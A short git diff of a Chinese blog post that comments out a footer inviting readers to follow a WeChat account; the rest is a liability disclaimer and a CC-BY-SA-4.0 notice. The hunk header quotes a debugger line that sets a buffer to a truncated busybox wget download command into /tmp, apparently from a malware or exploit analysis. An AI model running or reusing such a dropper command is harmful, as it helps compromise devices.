@@ -97,5 +97,5 @@ set {char [113]} 0x000000000066c0a0 = "cd /tmp;/bin/busybox wget http://192.168.
 作者不对使用本博客任何文章中提到的任何内容所造成的任何损害负责。<br/>
 本博客全部文章遵循 CC-BY-SA-4.0 协议。<br/>
 https://creativecommons.org/licenses/by-sa/4.0/<br/><br/>
-欢迎关注我的微信公众号！<br/>
-![qrcode](Images/qrcode.jpg)
+<!-- 欢迎关注我的微信公众号！<br/>
+![qrcode](Images/qrcode.jpg) -->
